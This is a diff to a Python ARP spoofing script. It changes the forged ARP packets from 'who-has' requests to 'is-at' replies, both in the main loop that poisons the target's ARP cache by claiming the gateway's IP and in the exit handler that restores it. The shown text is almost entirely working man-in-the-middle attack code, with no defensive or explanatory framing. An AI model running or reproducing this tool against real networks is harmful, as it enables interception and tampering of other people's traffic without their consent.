@@ -32,7 +32,7 @@ machines = get_machines.search(
 #ensure that it can be cancelled
 def restoreARP():
 	print("\rRestoring ARP   %s" % (" " * BAR_LENGTH))
-	net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=machines["target"].ip, hwsrc=machines["gateway"].mac, psrc=machines["gateway"].ip), verbose=VERBOSITY)
+	net.send(net.ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", pdst=machines["target"].ip, hwsrc=machines["gateway"].mac, psrc=machines["gateway"].ip), verbose=VERBOSITY)
 atexit.register(restoreARP)
 
 print("\r                        ", end="\r")
@@ -45,7 +45,7 @@ try:
 			break
 
 		#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
-		net.send(net.ARP(op="who-has", hwdst=machines["target"].mac, pdst=machines["target"].ip, psrc=machines["gateway"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="is-at", hwdst=machines["target"].mac, pdst=machines["target"].ip, psrc=machines["gateway"].ip), verbose=VERBOSITY)
 
 		bar = "=" * int(delta / args.length * BAR_LENGTH)
 		space = " " * (BAR_LENGTH - len(bar))
